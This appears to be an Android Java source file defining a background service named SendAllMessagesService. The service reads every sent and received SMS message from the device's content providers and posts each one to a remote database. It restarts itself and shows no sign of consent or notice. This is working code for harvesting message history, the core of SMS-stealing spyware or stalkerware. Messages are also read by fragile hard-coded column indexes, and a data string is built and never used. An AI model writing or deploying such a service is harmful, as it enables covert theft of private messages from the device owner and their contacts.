package com.test.myapplication.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.content.ContentResolver;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.annotation.Nullable;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.VolleyLog;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.test.myapplication.models.Messages;

import org.json.JSONObject;

import java.io.UnsupportedEncodingException;


public class SendAllMessagesService extends Service {

    protected void getAllSentSms(){
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {

                //CREATES A MESSAGE
                String msgData = "";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx)+idx;
                }

                //CREATES A POST REQUEST SENDS TO DB

                Messages messages = new Messages(cursor.getString(12),cursor.getString(2));
                SendToDBService post = new SendToDBService(messages.putsFieldsInJson(), messages.uri).perform(this);

            } while (cursor.moveToNext());
        }
    }


    protected void getallReceivedSms(){
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {

                //CREATES A MESSAGE
                String msgData = "";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx)+idx;
                }

                //CREATES A POST REQUEST SENDS TO DB
                Messages messages = new Messages(cursor.getString(12),cursor.getString(2));
                SendToDBService post = new SendToDBService(messages.putsFieldsInJson(), messages.uri).perform(this);

            } while (cursor.moveToNext());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int StartId){
        getAllSentSms();
        getallReceivedSms();
        return START_STICKY;
    }


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


}
